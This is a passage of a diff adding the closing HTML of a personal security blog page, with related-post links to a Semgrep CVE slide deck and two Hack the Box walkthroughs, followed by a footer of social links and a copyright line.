+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+        <a href="https://www.youtube.com/@sheerazali" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+        <a href="https://twitter.com/BeingSheerazAli" target="_blank" title="Twitter/X"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/pwnmeow" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
+      </div>
+      <div class="footer-copy">
+        <span class="cmd-prompt">$</span>
+        <span class="cmd-text">echo</span>
+        <span class="cmd-string">"&copy; 2026 Sheeraz Ali. All rights reserved."</span>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</div>
+
+<script src="/assets/js/main.js?v=96ad5fd1fb"></script>
+
+
+</body>
+</html>
